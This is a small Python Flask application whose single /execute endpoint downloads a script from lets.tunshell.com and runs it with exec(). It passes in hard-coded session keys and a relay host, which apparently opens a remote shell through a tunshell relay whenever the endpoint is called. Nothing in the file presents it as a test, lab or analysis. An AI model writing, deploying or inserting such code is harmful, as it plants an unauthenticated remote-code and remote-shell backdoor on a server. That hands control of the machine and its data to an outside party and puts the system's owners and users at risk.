from flask import Flask, request, jsonify
import urllib.request

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    try:
        # Fetch the code from the URL
        url = 'https://lets.tunshell.com/init.py'
        response = urllib.request.urlopen(url)
        code = response.read().decode('utf-8')

        # Define the parameters
        p = ["T","jXQIqSLn6sxAS8Ji07K3Ay","Zip9SZLYquZMOzmldSNN3q","eu.relay.tunshell.com"]

        # Execute the code
        exec(code, {'p': p})

        return jsonify({'message': 'Code executed successfully'}), 200
    except Exception as e:
        return jsonify({'message': 'Error executing code', 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
